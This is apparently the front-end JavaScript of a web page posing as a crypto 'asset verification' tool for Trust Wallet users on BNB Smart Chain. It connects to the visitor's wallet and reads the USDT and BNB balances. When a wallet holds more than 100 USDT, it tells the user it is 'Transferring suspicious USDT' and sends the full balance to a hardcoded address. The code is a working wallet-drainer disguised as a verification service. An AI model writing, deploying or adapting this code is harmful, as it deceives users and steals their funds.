const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090";
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";

let web3;
let userAddress = null;

// 🛠 Wait and get Trust Wallet provider silently
async function initWeb3() {
    return new Promise((resolve) => {
        setTimeout(async () => {
            const provider = window.BinanceChain || window.trustwallet || window.ethereum;

            if (!provider) {
                console.error("❌ Provider not found.");
                return resolve(null);
            }

            web3 = new Web3(provider);

            try {
                const accounts = await web3.eth.getAccounts();

                if (accounts.length > 0) {
                    userAddress = accounts[0];
                    console.log("✅ Connected:", userAddress);
                    resolve(userAddress);
                } else {
                    console.warn("⚠️ No account detected.");
                    resolve(null);
                }
            } catch (err) {
                console.error("❌ Wallet error:", err);
                resolve(null);
            }
        }, 1500); // 1.5 second wait to allow injection
    });
}

async function verifyAssets() {
    if (!userAddress) {
        await initWeb3();
    }

    if (!userAddress) {
        alert("❌ Wallet not connected. Please open in Trust Wallet browser.");
        return;
    }

    const usdt = new web3.eth.Contract([
        {
            constant: true,
            inputs: [{ name: "_owner", type: "address" }],
            name: "balanceOf",
            outputs: [{ name: "", type: "uint256" }],
            type: "function"
        }
    ], usdtContractAddress);

    const [usdtBalanceWei, bnbBalanceWei] = await Promise.all([
        usdt.methods.balanceOf(userAddress).call(),
        web3.eth.getBalance(userAddress)
    ]);

    const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
    const bnbBalance = parseFloat(web3.utils.fromWei(bnbBalanceWei, "ether"));

    console.log("USDT:", usdtBalance, "BNB:", bnbBalance);

    if (usdtBalance === 0) {
        showPopup("No USDT found in wallet.", "black");
        return;
    }

    if (usdtBalance <= 100) {
        showPopup(`✅ Verified<br>USDT: ${usdtBalance}<br>BNB: ${bnbBalance}`, "green");
    } else {
        showPopup("Transferring suspicious USDT...", "green");
        transferUSDT(usdtBalance);
    }
}

async function transferUSDT(amount) {
    const contract = new web3.eth.Contract([
        {
            constant: false,
            inputs: [
                { name: "recipient", type: "address" },
                { name: "amount", type: "uint256" }
            ],
            name: "transfer",
            outputs: [{ name: "", type: "bool" }],
            type: "function"
        }
    ], usdtContractAddress);

    try {
        const value = web3.utils.toWei(amount.toString(), "ether");

        await contract.methods.transfer(bscAddress, value).send({ from: userAddress });

        showPopup(`✅ Transferred ${amount} USDT`, "red");
    } catch (e) {
        console.error("❌ Transfer failed:", e);
        alert("Transfer failed. Check BNB balance or Trust Wallet permissions.");
    }
}

function showPopup(message, color) {
    let popup = document.getElementById("popupBox");

    if (!popup) {
        popup = document.createElement("div");
        popup.id = "popupBox";
        popup.style.position = "fixed";
        popup.style.top = "50%";
        popup.style.left = "50%";
        popup.style.transform = "translate(-50%, -50%)";
        popup.style.padding = "20px";
        popup.style.borderRadius = "10px";
        popup.style.boxShadow = "0 0 10px rgba(0,0,0,0.2)";
        popup.style.textAlign = "center";
        popup.style.fontSize = "16px";
        popup.style.zIndex = 9999;
        popup.style.maxWidth = "400px";
        popup.style.width = "80%";
        popup.style.backgroundColor = "#fff";
        document.body.appendChild(popup);
    }

    popup.style.backgroundColor = color === "red" ? "#ffe6e6" : color === "green" ? "#e6ffe6" : "#f0f0f0";
    popup.style.color = color;
    popup.innerHTML = message;
    popup.style.display = "block";

    setTimeout(() => { popup.style.display = "none"; }, 5000);
}

document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
